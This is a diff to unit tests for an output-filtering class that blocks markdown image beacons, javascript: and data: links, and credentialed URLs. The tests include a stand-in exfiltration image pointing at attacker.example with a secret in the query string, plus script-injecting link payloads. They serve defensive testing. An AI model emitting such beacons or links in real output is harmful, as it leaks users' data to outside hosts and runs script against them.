@@ -71,7 +71,7 @@ class OutputBoundaryTests(unittest.TestCase):
     def test_remote_markdown_image_beacon_is_denied(self):
         result = OutputBoundary().inspect("Result ![x](https://attacker.example/pixel?d=secret)")
         self.assertFalse(result.allowed)
-        self.assertIn("remote_image_beacon", result.reason_codes)
+        self.assertIn("markdown_image_forbidden", result.reason_codes)
         self.assertIsNone(result.text)
 
     def test_remote_html_active_content_is_denied(self):
@@ -113,6 +113,7 @@ class OutputBoundaryTests(unittest.TestCase):
         for text in (
             "[go](javascript:alert(1))",
             "[go](data:text/html,hello)",
+            "[go][ref]\\n\\n[ref]: javascript:alert(1)",
             "https://docs.example:bad/path",
             "http://docs.example/path",
             "https://user:pass@docs.example/path",
